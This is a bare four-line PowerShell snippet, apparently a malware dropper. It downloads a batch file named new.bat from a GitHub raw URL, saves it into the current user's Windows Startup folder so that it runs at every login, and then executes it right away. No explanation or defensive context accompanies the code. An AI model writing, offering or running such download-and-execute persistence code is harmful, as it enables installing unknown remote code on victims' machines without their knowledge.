$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/new.bat"
$output4 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\new.bat"
Invoke-WebRequest -Uri $url4 -OutFile $output4
& $output4
